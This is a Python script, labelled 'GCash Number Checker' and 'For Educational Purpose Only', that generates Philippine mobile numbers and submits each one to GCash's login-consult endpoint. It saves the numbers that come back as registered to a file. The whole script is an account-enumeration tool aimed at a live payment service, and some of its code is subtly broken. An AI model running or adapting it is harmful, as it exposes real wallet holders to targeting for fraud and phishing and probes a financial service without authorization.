import random
import sys
import os
import requests
import json
import colorama
r = "\033[31m"
g = "\033[32m"
w = "\033[37m"

print("""
\033[36m=======================================================================================================================
\033[36m=                                   \033[37mGCash Number Checker                                                              \033[36m=
\033[36m=======================================================================================================================
\033[36m=                                                                                                                     \033[36m=
\033[36m=   \033[32m██████╗  ██████╗ █████╗ ███████╗██╗  ██╗               ██████╗██╗  ██╗███████╗ ██████╗██╗  ██╗███████╗██████╗     \033[36m=
\033[36m=  \033[32m██╔════╝ ██╔════╝██╔══██╗██╔════╝██║  ██║              ██╔════╝██║  ██║██╔════╝██╔════╝██║ ██╔╝██╔════╝██╔══██╗    \033[36m= 
\033[36m=  \033[32m██║  ███╗██║     ███████║███████╗███████║    █████╗    ██║     ███████║█████╗  ██║     █████╔╝ █████╗  ██████╔╝    \033[36m=
\033[36m=  \033[32m██║   ██║██║     ██╔══██║╚════██║██╔══██║    ╚════╝    ██║     ██╔══██║██╔══╝  ██║     ██╔═██╗ ██╔══╝  ██╔══██╗    \033[36m=
\033[36m=  \033[32m╚██████╔╝╚██████╗██║  ██║███████║██║  ██║              ╚██████╗██║  ██║███████╗╚██████╗██║  ██╗███████╗██║  ██║    \033[36m=
\033[36m=   \033[32m╚═════╝  ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝               ╚═════╝╚═╝  ╚═╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝    \033[36m=
\033[36m=======================================================================================================================
\033[36m=                                   \033[37mFor Educational Purpose Only                                                      \033[36m=
\033[36m=======================================================================================================================                                                     
""")
def random_phone_num_generator():
    first = str(random.randint(100, 999))
    second = str(random.randint(1, 888)).zfill(3)

    last = (str(random.randint(1, 999)).zfill(3))
    while last in ['1111', '2222', '3333', '4444', '5555', '6666', '7777', '8888']:
        last = (str(random.randint(1, 999)).zfill(3))

    return '09062148{}'.format( last)

n = int(input("\033[32mEnter Value of number: "))



for i in range(n):
    randomNumber = random_phone_num_generator()
    response = requests.post('https://mgs-gw.paas.mynt.xyz/mgw.htm','operationType=alipayplus.mobilewallet.user.login.consult&requestData=[{"envInfo":{"tokenId":"76116844-0287-4ee8-9d2c-d7af66cc12de","osType":"WindowsNT","osVersion":"10.0","browserType":"Chrome","browserVersion":"93","terminalType":"WEB"},"loginIdType":"MOBILE_NO","loginId":"' + randomNumber + '","extParams":{"bizNo":"","sessionId":null,"bizTypeForMonitor":"ONLINE_LAZADA","merchantForMonitor":""}}]&version=2.0&workspaceId=PROD&appId=D54528A131559&tenantId=MYNTPH','?ctoken=')
    res = response.text
    data = res.find("true")
    if 0 < data:
        f = open("Valid_Number.txt",'a')
        f.write(randomNumber + "\n")
        f.close()
        print("\n\033[37m[" + randomNumber + "] \033[36m---> \033[32m[ Valid ]")
    else:
        print("\n\033[37m[" + randomNumber + "] \033[36m---> \033[31m[ Not Valid ]")